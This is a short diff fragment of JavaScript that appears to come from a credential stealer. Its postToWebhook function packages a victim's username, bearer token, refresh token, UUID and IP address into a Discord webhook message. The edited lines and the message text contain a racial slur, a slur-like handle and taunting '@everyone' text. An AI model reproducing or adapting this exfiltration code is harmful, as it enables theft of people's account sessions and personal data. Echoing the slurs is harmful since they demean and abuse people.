@@ -129,7 +129,7 @@ function getIp(req) {
 function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
     const url = webhook_url
     let data = {
-        username: "BEAMED BY ROA NIGGER",
+        username: "",
         avatar_url: "https://media.discordapp.net/attachments/1023156290828120155/1038117687156559962/bigrat-christmas-hat.png",
         content: "@everyone Loz and nine made this, bro is such a bozo @nigeer",
         embeds: [{
